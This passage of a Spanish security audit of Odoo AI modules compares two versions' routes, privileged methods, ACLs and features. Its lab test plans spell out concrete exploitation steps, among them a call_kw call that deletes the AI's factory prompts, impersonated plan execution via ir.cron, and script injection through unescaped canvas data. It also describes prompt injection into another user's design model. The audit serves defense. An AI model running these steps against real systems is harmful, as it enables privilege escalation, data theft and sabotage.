| `/pns_ai_mcp/key_pin/desk`, `/pns_ai_mcp/key_pin/supply` (`pns_ai_mcp/controllers/key_pin.py:23-35`) | `type='json'` → `JSON_ROUTE_TYPE` | json · user · — · — | `JSON_ROUTE_TYPE` es `'json'` en Odoo 14 (`pns_base/utils/compat.py:16`); mismas comprobaciones de AI Administrator (`key_pin.py:14-18`) | **VERIFICADO** (sin cambio efectivo) |
| `/chatboo/sessions/fulfill_export` con `kind='html'` (`chatboo.py:322-344`) | **Sin cambios**: idéntica en 3.1.782 (`:301-323`), `html` ya admitido | json · user · — · — | Acceso a Chatboo y sesión propia. El adjunto se crea con el uid real (`_run_on_committed_cursor`, `pns_ai_mcp/utils/session_download.py:379-383`), así que para un no administrador Odoo 14 lo guarda como `text/plain` (`odoo/addons/base/models/ir_attachment.py:331-340`); `session_file` lo sirve con ese tipo y `nosniff` (`pns_ai_mcp/controllers/session_file.py:50-74`, igual que en 3.1.782) | **VERIFICADO** (no es superficie nueva). El cursor propio con commit es el resto de PNS-07 (§3) |

Rutas **eliminadas**: `/chatboo/save_raw_for_template` (3.1.782 `chatboo.py:433-451`, exigía
`group_ai_admin`; §8.5) y `controllers/moe_controller.py` (sin rutas; PNS-49, §5.5). Rutas
**cambiadas ya tratadas**: `/pns_ai_mcp/verification/*` (token y espera: §2.1 y §3, PNS-54),
`/pns_ai_mcp/key_pin/stop` (CSRF: §2.1, PNS-89), `/mcp*` (`Origin`: §2.1, PNS-28; códigos de
estado: §5.5, PNS-39), `/chatboo/stream` y `/chatboo/sessions/save` (§2.1, PNS-61 y PNS-62).
**Sin cambios**: `/pns_ai_mcp/remote_image` (con `Content-Security-Policy: default-src 'none'` en las dos
versiones, `controllers/remote_image.py:37-38`), `/pns_ai_mcp/session_file/*` (código idéntico),
`/pns_ai_mcp/choice/*` y el resto de rutas de Chatboo (mismas comprobaciones, desplazadas de línea).

### 8.2 Métodos públicos con `sudo`, cursor propio, superusuario o `commit`

Lista completa de los públicos **nuevos o cambiados** con ese patrón en los tres módulos, más los que,
existiendo ya en 3.1.782, se han encontrado al comparar y no figuran ni en la auditoría ni en nuestro
informe (marcados «ya en 3.1.782»). `pns_base` no tiene ninguno nuevo con el patrón fuera de los ya
tratados (§8.6).

| Id | Método (3.1.879, archivo:línea) | Nuevo / ya en 3.1.782 | Privilegio | Quién puede llamarlo | Valoración | Resultado | Grav. |
|---|---|---|---|---|---|---|---|
| M1 | `chatboo.session.paint_canvas` (`pns_ai_chatboo/models/chatboo_session.py:1049-1184`) | Nuevo | `_store_design` escribe la página con `SUPERUSER_ID` en cursor propio y `commit` (`:974-1017`) | Cualquier interno por RPC (ACL `1,1,1,1` de `chatboo.session`, `security/ir.model.access.csv:2`), sin sesión propia; no mira el acceso a Chatboo ni la clave MCP | **No comprueba el dueño.** Con `new_page=True` no lee ningún campo del registro antes de `_store_design` (`:1079` corta en `new_page`; `_ask_design`, `_canvas_build_cancelled` y `canvas_public_url(rev=…)` solo usan `self.id` y el contexto, `:1186-1222, 1278-1281, 964-968`), así que la regla de `chatboo.session` no llega a aplicarse: un interno sobrescribe el lienzo (`canvas_design`, `canvas_open`, `canvas_rev`) de la sesión de **otro** usuario con lo que devuelva el modelo de diseño a su instrucción. Además gasta inferencia de la empresa (con tope: `pns_ai_mcp/utils/agent_engine.py:117`) | **NO CORREGIDO** (REQUIERE PRUEBA de confirmación, P-8c) | Media |
| M2 | `chatboo.session.page_html` (`chatboo_session.py:897-943`), publicado al sandbox en `sandbox_helpers` (`:817-840`) | Nuevo | Guarda con `_store_design` (superusuario, `commit`); **lee imágenes en `sudo`** | Solo un interno con sesión propia: por RPC con `ai_session_ref` = su sesión en el contexto (`resolve_session_ref`, `pns_ai_mcp/utils/session_download.py:547-563`); y el código del modelo en el sandbox | El dueño sí se comprueba (`_session_of_this_turn`, `models/chatboo_canvas.py:619-649`), pero devuelve la sesión **en `sudo`** (`:639`) y `page_html` pasa `session.env` a `pictures_as_tokens` (`chatboo_session.py:920`). Cada valor `/web/image/<modelo>/<id>/<campo>` de las filas se lee con `search` en ese entorno (`chatboo_canvas.py:677-697`): cualquier campo `binary`/`image` de cualquier modelo, sin ACL ni reglas, si su base64 empieza como una imagen (`:656-674`), y queda incrustado en la página del usuario. `open_page` usa el entorno del usuario (`:910`): el fallo es solo de `page_html` | **NO CORREGIDO** (REQUIERE PRUEBA, P-8d) | Media |
| M3 | `chatboo.session.page_url`, `page_edit` (`chatboo_session.py:874-962`) | Nuevos | `paint_canvas` → `_store_design` | Igual que M2 | Pasan por `_session_of_this_turn` (dueño) antes de pintar (`chatboo_canvas.py:891-893, 940-942`) e incrustan imágenes con el entorno del usuario. Escriben fuera de la caja A por diseño (docstring de `_store_design`, `chatboo_session.py:979-983`): es el patrón de PNS-07 (§3), acotado al lienzo propio | **VERIFICADO** (dueño) | — |
| M4 | `canvas_public_url`, `canvas_available`, `get_model_history` (`chatboo_session.py:964-968, 1268-1276, 219-239`) | Nuevos | Ninguno | Interno | Construyen una URL, miran si hay proveedor de diseño o leen la sesión propia | **VERIFICADO** | — |
| M5 | `chatboo.async.request.cron_maintenance` (`models/chatboo_async_request.py:1559-1586`) | Ya en 3.1.782 (`:2143-2167`); 3.1.879 añade los jobs del lienzo | `commit` del cursor de la petición (`:1570-1574`); `_cleanup_old_sessions` borra en `sudo` (§3, PNS-82) | Cualquier interno por RPC (`@api.model`, sin grupo) | Reclama y purga solo lo que las reglas dejan ver a quien llama, pero dispara la limpieza global de sesiones con la retención configurada: adelanta el cron, no hace nada que el cron no haga | **PARCIAL** (público sin necesidad) | Baja |
| M6 | `chatboo.job.mixin.request_cancel` (`models/chatboo_job.py:320-334`); `mark_seen` (`chatboo_async_request.py:1474-1486`) | `request_cancel` pasa al mixin; `mark_seen` igual | `sudo().write`; `mark_seen` escribe con cursor propio | Interno | Los dos filtran por `user_id = uid` antes de escribir | **VERIFICADO** | — |
| M7 | `ai.change.journal.model_can_archive` (`pns_ai_mcp/models/ai_change_journal.py:200-206`) | Nuevo | Ninguno | Cualquiera | Solo lee `_fields` del modelo pedido (informativo) | **VERIFICADO** | — |
| M8 | `ai.change.journal.action_empty_trash`, `action_empty_one` (`ai_change_journal.py:577-610`); `res.config.settings.action_empty_journal_trash` (`models/res_config_settings.py:383-388`) | Nuevos | `unlink` real de lo archivado | AI Administrator o Ajustes (`_ensure_journal_manager`, `ai_change_journal.py:38-45`; `ensure_ai_admin`) | Borran con los permisos de quien pulsa (`_empty_rows`, `:551-575`). La vía como superusuario es el cron (§6.1, PNS-37) | **VERIFICADO** | — |
| M9 | `action_revert`, `snapshot_records`, `record_executed_step` (`ai_change_journal.py:213-372, 443-539`) | Ya en 3.1.782 (`:188, 216, 411`) | `action_revert` crea la fila de deshacer en `sudo` (`:503`) | `action_revert`: gestor del diario; los otros dos crean o leen con la ACL normal (`csv:42-43`) | `action_revert` escribe los valores de `before_json` (editable por AI Administrator) con los permisos de quien pulsa: no da más de lo que ya puede hacer. Por RPC, `snapshot_records`/`record_executed_step` reciben recordsets/entornos que no se pueden pasar | **VERIFICADO** | — |
| M10 | `ai.safe.operation.create` (sin sobrescribir: Grep de `def create` en `models/safe_operation.py`, vacío) + `cleanup_stuck_state` (`:1006-1039`) → `_retry_confirmed_not_executed` (`:1041-1080`) | **Ya en 3.1.782** (`:938, 974-1012`) y en la rama (`pns_ai_mcp/models/safe_operation.py:938` (rama)) | Ejecuta el plan en cursor propio con `commit` y con el uid de `confirmed_by_uid` o `user_id` de la fila (`:1056-1070`) | AI Administrator (ACL `1,1,1,1`, `security/ir.model.access.csv:46`) | `write` está cerrado para no `sudo` (`:529-536`), pero `create` no: un AI Administrator crea por RPC una operación ya `confirmed`, `executed=False`, con `confirmed_by_uid` = cualquier usuario (p. ej. el administrador) y el plan que quiera, y llama a `cleanup_stuck_state` (público, sin grupo; la auditoría lo mantiene a propósito, `_fabricante/doc/20261022_pns_ai_auditoria.md:855`). El plan corre **con la identidad de ese usuario** (`api.Environment(cr, confirmed_by_uid, {})`; con uid 1, Odoo activa `su`). Mismo patrón que PNS-97 (registro editable tratado como fiable). En la rama, el parche 12 comprueba `self.env.user` (`ai_system_action.py:709` (rama)), que es el suplantado: el AI Administrator se da `base.group_system`. En 3.1.879 la cúspide frena el grupo, pero no cubre `ir.cron`, `ir.actions.server`, `ir.rule` ni `ir.model.access`: REQUIERE PRUEBA | **NO CORREGIDO** (confirmado en P-8b, fase 3) | **Crítica** (requiere AI Administrator) |
| M11 | `ai.execution.engine.log_llm_inference`, `log_provider_llm_request`, `log_provider_llm_response`, `log_provider_inference` (`:758`), `log_provider_failover`, `log_role_without_provider` (`models/ai_execution_engine.py:402-758`) | Ya en 3.1.782 (`:338-631`) y en la rama (`:488, 545` (rama)), salvo `log_role_without_provider` (nuevo). En 3.1.782 y en la rama el agujero ya estaba abierto además por `create_log_entry`, público (`ai_log.py:669`) | `_create_log_entry` en cursor propio como superusuario y con `commit` (`models/ai_log.py:685-724, 849`) | Cualquier usuario autenticado, también portal: `ai.execution.engine` es `AbstractModel` (`ai_execution_engine.py:93`), sin ACL que comprobar | Aceptan `user_id` y lo usan tal cual (`:422, 467, 583, 639, 730`). Por RPC, con `provider=False`, `log_llm_inference` crea una fila de `ai.log` a nombre de otro usuario con tokens y coste inventados. Es exactamente el «Check para Seges» de PNS-30 (auditoría `:219-220`): **el resto de PNS-30 sigue abierto por estos envoltorios**, aunque `_create_log_entry` sea privado (§2.1 lo da por VERIFICADO mirando solo ese método). Sin `provider_id` por RPC, no altera el tope de gasto | **NO CORREGIDO** (REQUIERE PRUEBA, P-8f) | Media |
| M12 | `ai.execution.engine.chat_completion` (`ai_execution_engine.py:849-923`) | Ya en 3.1.782 (`:719`) y en la rama (`:719` (rama)) | Usa la clave del proveedor (`_api_key_for_inference`, `:390`) | Cualquier interno (necesita leer `ai.agent`, `csv:13`) | Inferencia con la clave de la empresa sin pasar por el acceso de Chatboo ni por la clave MCP. Aplica el tope (`:372`) y lo que se envía es lo que el usuario ya puede leer (D10). La auditoría no lo trata; nuestro informe lo citaba solo como «sin llamadas» | **NO CORREGIDO** (REQUIERE PRUEBA, P-8g) | Baja |
| M13 | `ai.context.unlink_retired_from_module(module_name, found_codes)` (`models/ai_context_disk.py:757-796`) | **Nuevo** (en 3.1.782 no existe en `ai.context`: Grep) | `sudo()` + `skip_hardcoded_restrictions`, que abre el candado de fábrica (`utils/knowledge_ownership.py:38-49`; `unlink`, `models/ai_context.py:747-762`) | Cualquier usuario autenticado, también portal (`@api.model`, sin comprobación) | Borra **todos** los contextos de fábrica del módulo indicado (`owner_id` vacío y con `rel_path`) cuyo código no esté en `found_codes`, **lista que pone quien llama**: también los `core` (system prompt y reglas de ejecución de PNS-38). Su gemelo de skills exige superusuario (`_require_bootstrap`, `models/ai_skill.py:2228`) e `import_system_from_files` exige AI Administrator (`ai_context_disk.py:122`). Solo lo llama `ai_context_disk.py:745`. Deja la IA sin sus instrucciones hasta el siguiente `-u` o «Restaurar desde el módulo» | **NO CORREGIDO** (confirmado en P-8a, fase 3) | Alta |
| M14 | `ai.skill.unlink_retired_from_module`, `unlink_named_factory_skills` (`ai_skill.py:2219-2296`) | Ya en 3.1.782 (`:2136, 2184`) | `sudo` | Solo superusuario (`_require_bootstrap`) | Cerrados | **VERIFICADO** | — |
| M15 | `ai.provider.spend_cap_reached`, `assert_spend_cap`, `action_open_usage` (`models/ai_provider.py:1049-1076`) | Nuevos | Vía `month_usage` (`sudo` sobre `ai.log`) | Interno | Devuelven un booleano, un error o una acción hacia un asistente solo de AI Administrator (`csv:56`). `month_usage`: §6.1, PNS-29 | **VERIFICADO** | — |
| M16 | `ai.fx.source.get_usd_fx` (`models/ai_fx_source.py:86-166`) | Ya en 3.1.782 (`:86`) y en la rama | Lee las fuentes en `sudo` (`:108`), descarga con `urllib.request.urlopen` (`:73-84`) y escribe el parámetro de caché en `sudo` (`:95, 151, 163`) | Cualquier interno por RPC (`csv:12`); Chatboo al abrir | La URL la fija un AI Administrator (`csv:54`) y solo se exige `http(s)://` (`:49-56`): sin comprobación de host público, sin tope de tamaño y con las redirecciones por defecto de `urllib`. El texto del error (URL y excepción) vuelve a quien llama (`:116-117, 135-148`). No usa `request_public_http` (`utils/fetch_url_safe.py:113-178`), que sí existe. SSRF limitado para un AI Administrator (la respuesta solo se usa si trae un mapa `rates`) | **PARCIAL** | Baja |

Nota sobre `chatboo.session.sandbox_helpers` (`chatboo_session.py:817-840`): por RPC devuelve funciones
(no serializables) y no hace nada útil; lo que importa es lo que publica al sandbox (M2 y M3).

### 8.3 Modelos nuevos, ACL y reglas de registro

Comparación de `_name`/`_inherit` y de `security/` de los dos árboles. **Sin cambios** entre versiones:
`pns_base/security/ir.model.access.csv`, `pns_ai_mcp/security/security.xml` (mismas 15 reglas, mismos
dominios y permisos) y `pns_ai_mcp/security/security_groups.xml` (mismos grupos e `implied_ids`). En
`pns_ai_mcp/security/ir.model.access.csv` la única línea nueva es la 56 (asistente de consumo). Los
cambios de `pns_ai_chatboo` son los de la tabla.

| Id | Modelo o cambio | 3.1.879 (archivo:línea) | ACL / reglas | Valoración | Resultado | Grav. |
|---|---|---|---|---|---|---|
| D1 | `chatboo.canvas.page` (nuevo, `mail.thread`): copia fija de un lienzo compartida con usuarios nombrados | `pns_ai_chatboo/models/chatboo_canvas_page.py:25-176` | `base.group_user` `1,1,1,1` (`security/ir.model.access.csv:4`); lectura dueño o lector, escritura/alta/borrado solo dueño, AI Administrator todo (`security/security.xml:43-76`) | Bien acotado para usuarios normales. Dos restos: (1) la regla `[(1,'=',1)]` del AI Administrator le deja leer **todas** las páginas compartidas, que llevan incrustados los datos de las consultas de su dueño (p. ej. de RR. HH. o de otra compañía) aunque él no pueda leer esos registros; (2) en Odoo 14 `write` comprueba la regla **antes** de escribir (`odoo/models.py:3593-3595`): el dueño puede cambiar `owner_id` a otro usuario. El aviso a cada lector nuevo (`message_notify` y bus, `:86-139`) permite enviar mensajes de Discuss a cualquier interno | **PARCIAL** (REQUIERE PRUEBA el punto 2, P-8h) | Baja |
| D2 | `chatboo.canvas.job` (nuevo): construcción del lienzo en segundo plano | `models/chatboo_canvas_job.py:22-168` | `1,0,0,0` (`csv:5`); regla de dueño (`security.xml:31-41`; los `perm_*` de escritura de la regla no cuentan sin ACL) | El sistema crea y cierra en `sudo` o en cursor propio (`:58-69, 137-151`) | **VERIFICADO** | — |
| D3 | `chatboo.job.mixin` (nuevo, `AbstractModel`): base de los jobs de Chatboo | `models/chatboo_job.py:114-168` | — | `create` fija `user_id = uid` y exige sesión propia; `write` no deja mover `session_id`/`user_id` sin `sudo` (`:144-168`) | **VERIFICADO** | — |
| D4 | `chatboo.async.request`: ACL `1,1,1,0` → `1,0,0,0` y regla sin escritura | `csv:3`; `security.xml:20-29` | — | §2.1, PNS-55 | (§2.1) | — |
| D5 | `chatboo.session`: campos nuevos del lienzo (`canvas_open`, `canvas_design`, `canvas_rev`, `canvas_title`, `canvas_turn`) | `models/chatboo_session.py:80-92` | Regla de sesión propia con escritura (`security.xml:9-18`, sin cambios) | El dueño puede escribir por ORM cualquier HTML en su propio lienzo (lo mismo que `page_html`); solo lo ve él, salvo que lo comparta (D1, F1) | **VERIFICADO** | — |
| D6 | `ai.provider.usage.wizard` (nuevo): consumo del mes | `pns_ai_mcp/wizard/ai_provider_usage_wizard.py:10-40` | Solo `group_ai_admin` (`pns_ai_mcp/security/ir.model.access.csv:56`) | Lee `month_usage` (§6.1, PNS-29) | **VERIFICADO** | — |
| D7 | `ai.skill.param.token.legend.mixin` (nuevo, `AbstractModel`) | `pns_ai_mcp/models/skill_param_token_legend.py:11-15` | — | Solo `fields_view_get` de presentación | **VERIFICADO** | — |
| D8 | Herencias nuevas: `origin` con `selection_add` `chatboo` en `ai.log` y `ai.change.journal` (`pns_ai_chatboo/models/ai_log_door.py:18-33`, `ondelete` que no hace nada); `ir.http.session_info` en los dos módulos (`pns_ai_mcp/models/ir_http.py:13-19`; `pns_ai_chatboo/models/ir_http.py`) | — | — | Sin efecto de seguridad; `session_info`: §5.4 (PNS-31, PNS-72) | **VERIFICADO** | — |

### 8.4 Funciones nuevas (alto nivel)

| Id | Función | Qué hace (3.1.879, archivo:línea) | Quién la usa | Riesgo que abre | Resultado | Grav. |
|---|---|---|---|---|---|---|
| F1 | **Páginas / lienzo (Canvas)** y **proveedor de diseño** (casilla `design`, nueva: `pns_ai_mcp/utils/provider_fit.py:11`; en 3.1.782 la tupla acaba en `decision`) | Un modelo «de diseño» escribe un documento HTML con `const DATA` que el servidor rellena con las filas (`pns_ai_chatboo/models/chatboo_canvas.py:25-60, 884-930, 1476-1507`); se guarda en la sesión (D5) y se sirve en una carcasa con `iframe sandbox="allow-scripts allow-modals"` (`:500-573`); se puede compartir (D1) y descargar | Usuarios con Chatboo (botón Canvas y rutas de §8.1) y el propio modelo desde el sandbox (`page_url`, `page_edit`, `page_html`) | (1) **Sin CSP** en la carcasa ni en la página (Grep de `Content-Security-Policy` en 3.1.879: solo `remote_image.py:38`): el script del documento puede enviar `DATA` a cualquier host (una imagen o `fetch` sin CORS bastan desde un origen opaco). Se salta la lista blanca de PNS-59; la única barrera es la frase «Do not fetch» del prompt (`:44`). (2) Las filas se insertan en el `<script>` con `json.dumps`, que no escapa `</` (`:1097-1109, 1423-1434`); el fabricante sí escapa `</` en otro punto (`:2200`), pero no en `DATA`: un valor de un registro con `</script><script>…` se ejecuta dentro del marco (inyección almacenada desde datos que pueden escribir terceros, p. ej. el nombre de un contacto). (3) Una página compartida enseña a otros, bajo la URL de Odoo, el HTML que quiso su dueño (formularios falsos dentro del marco). (4) El HTML descargado se abre sin `sandbox`. (5) M1 y M2. El `sandbox` sin `allow-same-origin` sí impide tocar la sesión de Odoo, y los manejadores de `postMessage` del marco miran `e.source === window.parent` (`:131-154`) | **PARCIAL** (REQUIERE PRUEBA, P-8e) | Media |
| F2 | Protocolos `openrouter` y `systemone` | **No son nuevos**: los dos ya están en la selección y en el registro de 3.1.782 (`models/ai_provider.py:169-173` en las dos versiones; `lib/llm/drivers/__init__.py:13-16`). 3.1.879 solo añade un endpoint por defecto a OpenRouter (`openrouter_driver.py:16`) y quita `ollama_driver.py` (PNS-49) | AI Administrator (configura el proveedor) | El de `systemone` sigue llamando con `urlopen` al endpoint del proveedor (`systemone_driver.py:66, 96`), igual que en 3.1.782 | **VERIFICADO** (sin cambio) | — |
| F3 | **Orígenes MCP permitidos** | Parámetro `pns_ai_mcp.mcp_allowed_origins` en Ajustes (`models/res_config_settings.py:81-83`); sin `Origin` pasa, con `Origin` solo el de `web.base.url` o los listados (`utils/mcp_origin.py:38-49`). `Origin: null` (marcos `sandbox`, `file://`) no pasa salvo que se liste | Administrador de Ajustes | Ninguno nuevo: la página del lienzo no puede llamar a `/mcp` desde su origen opaco. Resto del preflight: §2.1 y §3, PNS-28 | **VERIFICADO** | — |
| F4 | **Exportación a PDF desde el chat** (no es nueva; hallazgo de la fase 3, P-6 ampliada, caso c) | El exportador del lado del cliente (`pns_ai_chatboo/static/src/js/chatboo_export.js`, «Preparar y descargar» de la ficha de PDF) genera el PDF del turno | Usuarios con Chatboo | Funcional, sin efecto de seguridad: el PDF muestra como texto, antes de la tabla, el HTML del bloque de tabla (§8.7) | **NO CORREGIDO** | Baja |

Las demás funciones de la lista se tratan donde se indica: proveedor de **decisión** (ya existía la
casilla en 3.1.782, `provider_fit.py:11`; ahora la usa `_choose`, `models/ai_execution_engine.py:334`,
y `utils/engine_discovery.py:108, 190`; misma lógica de cadena que §6.1, PNS-18), **papelera de
borrados** (§6.1, PNS-37), **topes de gasto** (§6.1, PNS-29), **revisión antes de importar** (§6.1,
PNS-20), **token de la tarjeta** (§3, PNS-54), **voces remotas** (§6, PNS-64) y **tipos de cambio**
(no es nueva: M16).

### 8.5 Correcciones de seguridad que no figuran en la auditoría

| Id | Corrección | 3.1.782 → 3.1.879 (archivo:línea) | Qué dice la auditoría | Resultado |
|---|---|---|---|---|
| C1 | Se elimina la ruta `/chatboo/save_raw_for_template`, que creaba `pns_ai_mcp.relaxaicode_raw_result` (tabla ya fósil, `pns_ai_mcp/utils/schema_fossils.py:27`) | 3.1.782 `pns_ai_chatboo/controllers/chatboo.py:433-451` → no existe (Grep) | Solo cita el `_saveRawForTemplate` del cliente, «ya no estaba» (auditoría `:857`) | **VERIFICADO** |
| C2 | Los jobs de Chatboo no se pueden crear en una sesión ajena ni mover de sesión o de usuario sin `sudo`, también por código del servidor (no solo por ACL) | `pns_ai_chatboo/models/chatboo_job.py:144-168` (nuevo mixin) | PNS-55 habla de la ACL y de la regla, no de esta guarda | **VERIFICADO** |

No se ha encontrado ninguna otra corrección de seguridad sin ficha: el resto de cambios con efecto de
seguridad que se ven al comparar están en las fichas de §2, §5 y §6.

### 8.6 Candidatos ya tratados en otras secciones (remisión, no se cuentan)

| Candidato | Dónde |
|---|---|
| `ai.key.pin.ask.collect_pin` y demás públicos de la mesa del PIN | §3, PNS-83 y PNS-84 |
| `ai.safe.operation.card_payload` / `pending_card_payloads` (renombrados desde `chatboo_card_payload` / `chatboo_pending_card_payloads`, 3.1.782 `models/safe_operation.py:1946, 1975`; ahora emiten token) y `action_confirm_and_execute` | §3, PNS-54 |
| `ai.safe.operation.create_verification` (`models/safe_operation.py:460-526`) | Ya en 3.1.782 (`:434-500`), sin `sudo` y con la ACL normal (solo AI Administrator crea). Su problema real es el `create` libre: M10 |
| `execute_plan_now` y los `commit()` de la Caja B sobre el cursor de la petición (`safe_operation.py:918, 927, 1325, 1424, 1468`) | §5.6 y §7, PNS-26 |
| `_run_on_committed_cursor` en `_finalize` | §5.6, PNS-94 |
| `_run_tool_in_savepoint` / `SAVEPOINT` en SQL directo del motor | §5.6, PNS-26 |
| `chatboo.session.fulfill_client_export` | §3, PNS-07 y PNS-98 |
| Cron `_cron_empty_journal_trash` como superusuario y `unlink` del plan que archiva | §6.1, PNS-37 |
| `ai.provider.month_usage` en `sudo` y tope anulable purgando `ai.log` | §6.1, PNS-29 |
| `pns.operation.report.wizard.action_preview` | §6.1, PNS-20 |
| `Base.fields_view_get` global y `_alias_groups_vals` de `pns_base` | §5.4 y §5.7 (PNS-42, PB-2) |
| `ai.skill.import_from_module` | §6, obs. 11 |
| Campos de `ai.agent` de Chatboo que escriben parámetros globales en `sudo` (`pns_ai_chatboo/models/ai_agent.py:93-137` → `utils/chatboo_product_icp.py:158-219`), incluido el nuevo `allow_remote_voices` | §5.2 (obs. 5) y §6 (PNS-64). Solo los escribe quien puede escribir `ai.agent` (AI Administrator, `pns_ai_mcp/security/ir.model.access.csv:59`) |
| Capas `z-index` 20000 y 1060 de Chatboo | §5.5, PNS-73 |

### 8.7 Detalle de NO CORREGIDO, PARCIAL y pruebas

#### M13 (Alta) — NO CORREGIDO: cualquier usuario borra los contextos de fábrica

- `unlink_retired_from_module` (`models/ai_context_disk.py:757-796`) es nuevo, `@api.model` y no
  comprueba nada. Trabaja en `sudo()` con `skip_hardcoded_restrictions=True`, que es justo la
  combinación que abre el candado de fábrica (`utils/knowledge_ownership.py:38-49`) del `unlink` de
  `ai.context` (`models/ai_context.py:747-762`). La lista de códigos que se conservan
  (`found_codes`) la pone quien llama.
- Efecto: `call_kw('ai.context', 'unlink_retired_from_module', ['pns_ai_mcp', ['x']])` desde un
  interno sin grupos de IA, o desde un usuario de portal, borra todos los contextos de fábrica de
  `pns_ai_mcp` con `rel_path` (incluidos los `core`), y quita sus enlaces con los agentes. La IA
  queda sin el system prompt ni las reglas (las de PNS-38, entre ellas) hasta un `-u` o «Restaurar
  desde el módulo». No da acceso a datos.
- **P-8a:** en el laboratorio, `SELECT count(*) FROM ai_context WHERE source_module = 'pns_ai_mcp' AND
  owner_id IS NULL`; como interno sin grupos de IA (y repetir con un portal), la llamada de arriba
  por `call_kw`; repetir el `SELECT`. Esperado si está bien: `AccessError` y el mismo recuento. Hoy se
  espera que el recuento baje a 0 o 1.
- **Resultado de P-8a (fase 3, 22/10/2026): M13 confirmado en 3.1.879.** Un usuario interno sin grupos
  de IA y un usuario de portal borran los 53 contextos de fábrica de `pns_ai_mcp` (53 → 0 en los dos
  casos; la llamada se acepta en lugar de dar `AccessError`). Se hizo dentro de un `SAVEPOINT`
  deshecho. Detalle: `fase3_lab_pns_ai_3879.md`, parte 1 (paso 4).

#### M10 (Crítica, requiere AI Administrator) — NO CORREGIDO: ejecutar un plan con la identidad de otro usuario

- `ai.safe.operation` no sobrescribe `create` y el AI Administrator tiene `create`
  (`security/ir.model.access.csv:46`). `write` está cerrado para no `sudo`
  (`models/safe_operation.py:529-536`), pero en el alta se pueden poner `status='confirmed'`,
  `executed=False`, `user_id`, `confirmed_by_uid` y `operation_data` (el plan) a mano.
- `cleanup_stuck_state` (`:1006-1039`) es público, no mira grupos y llama a
  `_retry_confirmed_not_executed` (`:1041-1080`), que abre un cursor con el uid de
  `confirmed_by_uid` (o `user_id`, o el superusuario si los dos faltan, `:1056-1060`) y llama a
  `execute_plan_now`, que ejecuta el plan con ese entorno y hace `commit` (`:1409-1468`).
- `execute_plan_now` construye el entorno con `api.Environment(cr, confirmed_by_uid, {})`; con uid 1
  Odoo activa `su`.
- Efecto: un AI Administrator sin Ajustes ejecuta cualquier plan de la Caja B como el
  administrador (o como cualquier usuario).
  - **En la rama (y en 3.1.782):** el parche 12 comprueba `self.env.user`
    (`pns_ai_mcp/models/ai_system_action.py:709` (rama)), que en este camino es el usuario suplantado.
    Con `confirmed_by_uid` = 1 o 2, la comprobación pasa y el AI Administrator se da
    `base.group_system`: es la escalada de PNS-01 por otra puerta. Gravedad **Crítica**.
  - **En 3.1.879:** `_resolve_group_below_cusp` (§2.1) frena dar el grupo, pero la cúspide no cubre
    `ir.cron`, `ir.actions.server`, `ir.rule` ni `ir.model.access`: un plan que cree un `ir.cron` o
    una acción de servidor con código podría llegar al mismo sitio. **REQUIERE PRUEBA.**
  Ya estaba en 3.1.782 y está en nuestra rama; ni la auditoría ni nuestro informe lo recogen (nuestro
  análisis lo dio por código muerto, `docs/specs/analisis_pns_ai_mcp_5_caja_b.md:308, 481`; el
  fabricante lo mantiene a propósito, auditoría `:855`).
- **P-8b:** AI Administrator sin Ajustes, por `call_kw`: `create` de `ai.safe.operation` con los campos
  obligatorios del modelo, `status='confirmed'`, `executed=False`, `user_id` y `confirmed_by_uid` = 2,
  y `operation_data` con un plan de un paso `write` sobre un contacto de prueba (`comment = 'P-8b'`);
  después `cleanup_stuck_state`. `SELECT write_uid, comment FROM res_partner WHERE id = <contacto>` y la
  fila nueva de `ai_change_journal`. Esperado si está bien: el `create` se rechaza. Hoy se espera
  `write_uid = 2`. **Segundo caso:** la misma operación con un plan de un paso `create` de `ir.cron`
  (modelo `res.partner`, `state='code'`, código inocuo que escriba `comment = 'P-8b-cron'` en el
  contacto, `user_id` = 2, `nextcall` en el pasado). Comprobar si el cron se crea y, tras ejecutarse, el
  `write_uid` del contacto. Esperado si está bien: rechazo en el `create` de la operación o en el paso.
  En la rama, además: plan que añada `base.group_system` al propio AI Administrator (hoy se espera que
  lo consiga).
- **Resultado de P-8b (fase 3, 22/10/2026): M10 confirmado en 3.1.879; sigue siendo Crítica.**
  - Un AI Administrator sin Ajustes crea una operación ya confirmada a nombre de otro usuario y la hace
    ejecutar con `cleanup_stuck_state`: el plan corre con la identidad del suplantado (escritura y fila
    del diario con su uid).
  - **Condición real:** suplantar a un usuario con Ajustes y AI Writer. Al suplantar al admin de una BD
    nueva, sin AI Writer, los pasos CRUD se rechazan en la ejecución.
  - **La cúspide no cubre `ir.cron`:** con la identidad de ese usuario, el plan crea un `ir.cron` cuyo
    `user_id` es el admin, y su código se ejecuta como el admin. El REQUIERE PRUEBA de arriba queda
    resuelto en contra.
  - No se probó el caso de la rama (darse `base.group_system`). Detalle: `fase3_lab_pns_ai_3879.md`,
    parte 1 (paso 4).

#### M1 (Media) — NO CORREGIDO: `paint_canvas` escribe el lienzo de otra sesión

- Ver la fila. La cadena de llamadas no lee ningún campo del registro con `new_page=True`, así que la
  regla de `chatboo.session` no se evalúa antes de `_store_design`, que escribe como superusuario y
  confirma.
- Efecto: integridad del lienzo ajeno (lo que el usuario víctima verá en su pestaña Canvas, dentro del
  `sandbox`) y, en su siguiente `page_edit`, ese documento va al modelo de diseño como «Current page»
  (`chatboo_session.py:1079-1083`): inyección en las llamadas de diseño de otro usuario. Requiere un
  proveedor con la casilla de diseño en la cadena de Chatboo.
- **P-8c:** usuarios A y B internos; B con una sesión de Chatboo S. Como A, `call_kw` a
  `chatboo.session.paint_canvas` con `ids = [S]`, instrucción «Devuelve exactamente este documento:
  `<html><body>P-8c</body></html>`» y `new_page=True`. `SELECT canvas_rev, left(canvas_design, 80) FROM
  chatboo_session WHERE id = S`. Esperado si está bien: `AccessError`, sin cambios.

#### M2 (Media) — NO CORREGIDO: `page_html` lee imágenes en `sudo`

- Ver la fila. Por RPC basta con poner `ai_session_ref` en el contexto; desde el sandbox, el modelo
  lo tiene disponible como `page_html` (`sandbox_helpers`).
- **P-8d:** interno sin acceso a un registro con imagen (p. ej. un empleado, o un contacto de otra
  compañía). `call_kw` a `chatboo.session.page_html` (ids vacíos), con contexto `ai_session_ref` =
  su sesión, `html='<html><body><script>const DATA=[];</script></body></html>'` y `rows=[{'title':
  't', 'data': [{'img': '/web/image/<modelo>/<id>/image_128'}]}]`. `SELECT canvas_design LIKE
  '%data:image%' FROM chatboo_session WHERE id = <su sesión>`. Esperado si está bien: `false`.

#### M11 (Media) — NO CORREGIDO: filas de `ai.log` a nombre de otro usuario

- Ver la fila. Contradice la comprobación que el fabricante propone para PNS-30 (auditoría `:219-220`)
